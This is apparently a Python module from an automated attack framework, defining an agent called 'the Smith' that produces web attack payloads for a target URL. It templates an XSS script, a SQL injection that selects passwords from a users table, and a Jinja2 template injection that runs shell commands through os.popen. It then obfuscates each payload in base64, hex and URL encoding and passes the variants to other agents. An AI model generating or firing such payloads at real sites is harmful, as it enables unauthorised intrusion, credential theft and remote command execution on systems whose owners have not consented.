import asyncio
import base64
import random
import urllib.parse
from backend.core.hive import BaseAgent, EventType, HiveEvent
from backend.core.protocol import JobPacket, ResultPacket, AgentID

class SigmaAgent(BaseAgent):
    """
    AGENT SIGMA: THE SMITH
    Role: Generative Weaponssmith.
    Capabilities:
    - Context-Aware Code Gen (Template Engine).
    - Obfuscation Engine (Base64, Hex, URL).
    """
    def __init__(self, bus):
        super().__init__("agent_sigma", bus)
        
        # SOTA: Mocking an LLM with advanced template interpolation
        self.payload_templates = [
            "<script>alert('{context_var}')</script>",
            "UNION SELECT {context_table}, password FROM users--",
            "{{{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}"
        ]

    async def setup(self):
        # Listen for requests to generate payloads (e.g. from Beta)
        self.bus.subscribe(EventType.JOB_ASSIGNED, self.handle_generation_request)

    async def handle_generation_request(self, event: HiveEvent):
        # Sigma primarily serves other agents, but can execute "Gen-AI" jobs
        packet_dict = event.payload
        try:
             packet = JobPacket(**packet_dict)
        except: return

        if packet.config.agent_id != AgentID.SIGMA:
            return

        print(f"[{self.name}] Forging payloads for {packet.target.url}...")
        
        # 1. CONTEXT AWARE GENERATION
        # Infer context from URL or Headers
        context = {
            "context_var": "XSS_BY_SIGMA",
            "context_table": "admin_creds",
            "cmd": "id"
        }
        
        generated_payloads = []
        for template in self.payload_templates:
            raw_payload = template.format(**context)
            generated_payloads.append(raw_payload)
            
            # 2. OBFUSCATION ENGINE
            # Generate variants
            generated_payloads.append(self.obfuscate(raw_payload, "base64"))
            generated_payloads.append(self.obfuscate(raw_payload, "hex"))
            generated_payloads.append(self.obfuscate(raw_payload, "url"))

        # Publish Results (The "Weapon Shipment")
        await self.bus.publish(HiveEvent(
            type=EventType.JOB_COMPLETED,
            source=self.name,
            payload={
                "job_id": packet.id,
                "status": "SUCCESS",
                "data": {"generated_payloads": generated_payloads}
            }
        ))
        print(f"[{self.name}] Forged {len(generated_payloads)} SOTA payloads.")

    def obfuscate(self, payload: str, method: str) -> str:
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "hex":
            return "".join([hex(ord(c)) for c in payload])
        elif method == "url":
            return urllib.parse.quote(payload)
        return payload
